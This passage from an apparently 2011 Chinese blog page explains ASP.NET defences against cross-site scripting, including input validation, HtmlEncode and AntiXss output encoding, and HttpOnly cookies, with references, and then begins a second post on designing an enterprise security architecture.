font-weight: normal; text-decoration: none">Cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">等等，可以考虑使用</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">System.Text.RegularExpressions.Regex</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">类用正则表达式来验证。</span> </li> <li style="background-color: transparent; list-style-type: disc; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">验证其它非字符串的类型，如整数，日期，货币单位等等，可以考虑用</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">.NET Framework</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">数据类型校验。</span> </li> </ul> <p><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">有兴趣的读者可以参考【</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">3</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">】获取进一步的信息。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">对输出进行编码以过滤特殊字符</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">当需要将一个字符串输出到</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Web</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">网页时，但又不能完全确定这个字符串是否包括</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HTML</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的特殊字符，例如“</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;,&gt;,&amp;</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">”等等，可以使用编码（</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HTMLEncode</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">）以过滤这些特殊字符。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">有以下两种</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HTMLEncode </span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">手段</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">使用</span><a href="http://asp.net/"><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000099; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: underline">ASP.NET</span></a><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">自身支持的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">HttpUtility</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">例如：</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Response.Write(HttpUtility.HtmlEncode(Request.Form[&quot;name&quot;]));</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">使用微软提供的反跨站脚本库</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">（</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Microsoft Anti-Cross Site Scripting Library V1.5 – AntiXss</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">）。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">AntiXSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">是一个单独下载的软件库。开发人员可以从</span><a href="http://www.microsoft.com/downloads/details.aspx?FamilyId=EFB9C819-53FF-4F82-BFAF-E11625130C25&amp;displaylang=en"><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #0000ff; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">http://www.microsoft.com/downloads/details.aspx?FamilyId=EFB9C819-53FF-4F82-BFAF-E11625130C25&amp;displaylang=en</span></a><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">直接下载。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">AntiXss</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的使用方式与</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HttpUtility</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">类似：</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">String Name = AntiXss.HtmlEncode(Request.QueryString[&quot;Name&quot;]);</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">那么</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HttpUtility</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">和</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">AntiXss</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的区别是什么？开发人员应该使用哪一种？</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">它们最大的区别在于</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HttpUtility.HtmlEncode</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">采用的是黑名单验证（</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Black list</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">）方式。即</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HttpUtility.HtmlEncode</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">仅仅过滤它知道的特殊字符，而允许其它的输入。</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">AntiXss.HtmlEncode</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">采用的白名单验证（</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">White list</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">）方式。它只允许输出它认为合法的字符，而过滤掉其它的所有字符。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">两者中，</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">AntiXss.HtmlEncode</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">要更为安全，是推荐的使用手段。关于</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">AntiXss</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的进一步信息，读者可以参考【</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">4</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">】。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HttpOnly&#160; Cookie</span> <br /><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HttpOnly cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">是一种对抗</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">安全漏洞的深层防御手段。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Web</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">应用可以通过设置如下的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Http Respone</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">头信息将</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的属性设为</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HttpOnly</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Set-Cookie: USER=123; expires=Wednesday, 09-Nov-99 23:12:40 GMT; HttpOnly</span> <br /><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">IE6 SP1</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">版本后就会确保客户端的脚本不能使用属性设为</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HttpOnly </span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">。从而可以有效的降低</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">安全漏洞的危害程度。当然，如果用户使用非</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">IE</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">浏览器，</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HttpOnly</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">就无效了。关于</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HttpOnly Cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的进一步信息，读者可以参考【</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">5</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">】。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">5.总结</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">跨站脚本</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">是最为常见的一类</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Web</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">安全漏洞。它会导致用户敏感信息的丢失。</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Web</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">开发人员在开发过程中应采取必要的校验和编码手段来避免</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">安全漏洞。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">6.参考文献</span> <ol> <li style="background-color: transparent; list-style-type: decimal; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Cross-site scripting,</span><a href="http://en.wikipedia.org/wiki/Cross-site_scripting"><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> </span><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #0000ff; font-size: 10pt; vertical-align: baseline; font-weight: bold; text-decoration: underline">http://en.wikipedia.org/wiki/Cross-site_scripting</span></a><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">, Wikipedia</span> </li> <li style="background-color: transparent; list-style-type: decimal; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">How To: Prevent Cross-Site Scripting in</span><a href="http://asp.net/"><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> </span><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000099; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">ASP.NET</span></a><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">,</span><a href="http://msdn.microsoft.com/en-au/library/ms998274.aspx#paght000004_step2"><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> </span><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #0000ff; font-size: 10pt; vertical-align: baseline; font-weight: bold; text-decoration: underline">http://msdn.microsoft.com/en-au/library/ms998274.aspx#paght000004_step2</span></a><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">, Microsoft</span> </li> <li style="background-color: transparent; list-style-type: decimal; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">How To: Protect From Injection Attacks in</span><a href="http://asp.net/"><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> </span><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000099; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">ASP.NET</span></a><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">,</span><a href="http://msdn.microsoft.com/en-au/library/bb355989.aspx"><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> </span><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #0000ff; font-size: 10pt; vertical-align: baseline; font-weight: bold; text-decoration: underline">http://msdn.microsoft.com/en-au/library/bb355989.aspx</span></a><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">, Microsoft</span> </li> <li style="background-color: transparent; list-style-type: decimal; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Microsoft Anti-Cross Site Scripting Library V1.5: Protecting the Contoso Bookmark Page,</span><a href="http://msdn.microsoft.com/en-us/library/aa973813.aspx"><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> </span><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #0000ff; font-size: 10pt; vertical-align: baseline; font-weight: bold; text-decoration: underline">http://msdn.microsoft.com/en-us/library/aa973813.aspx</span></a><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">, Microsoft</span> </li> <li style="background-color: transparent; list-style-type: decimal; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Mitigating Cross-site Scripting With HTTP-only Cookies,</span><a href="http://msdn.microsoft.com/en-us/library/ms533046.aspx"><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> </span><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #0000ff; font-size: 10pt; vertical-align: baseline; font-weight: bold; text-decoration: underline">http://msdn.microsoft.com/en-us/library/ms533046.aspx</span></a><span style="background-color: transparent; font-style: italic; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">, Microsoft</span> </li> </ol> <p><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Tags:</span><a href="http://hackeye.com/post/tag/xss"><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> </span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000099; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">XSS</span></a> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"></span></p> <p class="read-more">Continue reading <a class="heading" href="/web/web%E5%89%8D%E7%AB%AF/2011/06/09/e3-80-90-e8-bd-ac-e3-80-91-e8-b7-a8-e7-ab-99-e8-84-9a-e6-9c-acxss-e8-a4-9a-e8-af-9a-e4-ba-91.html" data-flip="title">【转】跨站脚本XSS–褚诚云</a></p> </article> <article id="post-%E5%AE%89%E5%85%A8/2011/06/09/%e3%80%90%e5%8f%82%e8%80%83%e3%80%91%e8%ae%be%e8%ae%a1%e4%bc%81%e4%b8%9a%e4%bf%a1%e6%81%af%e7%b3%bb%e7%bb%9f%e7%9a%84%e5%ae%89%e5%85%a8%e4%bd%93%e7%b3%bb" class="post mb6" role="article"> <header> <h1 class="post-title"> <a href="/%E5%AE%89%E5%85%A8/2011/06/09/e3-80-90-e5-8f-82-e8-80-83-e3-80-91-e8-ae-be-e8-ae-a1-e4-bc-81-e4-b8-9a-e4-bf-a1-e6-81-af-e7-b3-bb-e7-bb-9f-e7-9a-84-e5-ae-89-e5-85-a8-e4-bd-93-e7-b3-bb.html" data-flip="title"> 【参考】设计企业信息系统的安全体系 </a> </h1> <p class="post-date heading"> <time datetime="2011-06-09T17:53:40+08:00">09 Jun 2011</time> in <span>安全</span> </p> <div class="hr" style="padding-bottom:0"></div> </header> <p style="text-align: center;margin-top: 0pt;margin-bottom: 0pt"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">设计企业信息系统的安全体系 </span></p> <p> <span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160;&#160; 一项建筑工程实施的依据是它的建筑蓝图，是一张张的图纸，这些图纸是经过许多建筑师、设计师分析地理位置、土质、风向、空气湿度、供电、供水、建材类型、 强度、造型等多种因素，并经过多番论证才得出的成果，里面包含了很多智慧的结晶。同样，信息网络系统的安全工程也需要一个构建蓝图，一个实施依据，否则就 会没有结果或者结果只是一些“豆腐渣”工程。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 安全体系是安全工程实施的指导方针和必要依据，它的质量也决定了安全工程的质量。所以，应把安全体系的设计提升到一定的高度，确保安全体系的可靠性、可行性、完备性和可扩展性。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">一、好的安全体系 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; 具有什么特征？ </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; 为了保证安全体系的实用性，在设计安全体系时，必须遵循以下四项原则： </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; (1) 体系的安全性：设计安全体系的最终目的是为安全工程提供一个可靠的依据和指导，保护信息与网络系统的安全，所以安全性成为首要目标。要保证体系的安全性， 必须保证体系的可理解性、完备性和可扩展性。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; (2) 体系的可行性：设计体系不能纯粹地从理论角度考虑，再完美的方案，如果不考虑实际因素，那么也只能是一些废纸。设计安全体系的目的是指导安全工程的实施， 它的价值也体现在所设计的工程上，如果工程的难度太大以至于无法实施，那么体系本身也就没有了实际价值。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; (3) 系统的高效性：信息与网络系统对安全提出要求的目的是能保证系统的正常运行，如果安全影响了系统的运行，那么就需要进行权衡了。信息网络系统的安全体系包 含一些软件和硬件，它们也会占用信息网络系统的一些资源。因此，在设计安全体系时必须考虑系统资源的开销，要求安全防护系统本身不能妨碍信息网络系统的正 常运转。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; (4) 体系的可承担性：安全体系从设计到工程实施以及安全系统的后期维护、安全培训等各个方面的工作都是由对象单位来支持的，单位要为此付出一定的代价和开销。 如果单位要付出的代价比从安全体系中获得的利益还要多，那么单位就不会采用这个方案。所以，在设计安全体系时，必须考虑单位的实际承受能力。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">二、安全体系 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; 包括什么内容？ </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; 一个完整的安全体系应该包含以下几个基本的部分，根据具体情况的不同，可以在此基础上进行修剪或扩展。 </span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">&#160;&#160;&#160; </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">(1) 风险管理：</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 